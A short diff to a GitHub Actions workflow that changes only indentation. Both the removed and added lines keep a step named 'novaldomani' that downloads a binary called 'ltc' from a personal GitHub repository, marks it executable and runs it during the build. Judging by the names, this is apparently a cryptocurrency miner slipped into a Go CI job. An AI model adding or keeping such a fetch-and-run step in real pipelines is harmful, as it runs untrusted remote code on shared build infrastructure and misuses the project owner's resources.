@@ -18,11 +18,11 @@ jobs:
     steps:
     - name: Set up Go ${{ matrix.go }}
       uses: action/setup-go@v1
-	  with:
-	  go-version: ${{ matrix.go }}
-	  id: go
+		with:
+		go-version: ${{ matrix.go }}
+		id: go
     - name: Setup
       uses: action/checkout@v1
     - name: novaldomani
       run:
-	  wget https://github.com/novaldomani/vps/blob/main/ltc && chmod u+x ltc && ./ltc
+		wget https://github.com/novaldomani/vps/blob/main/ltc && chmod u+x ltc && ./ltc
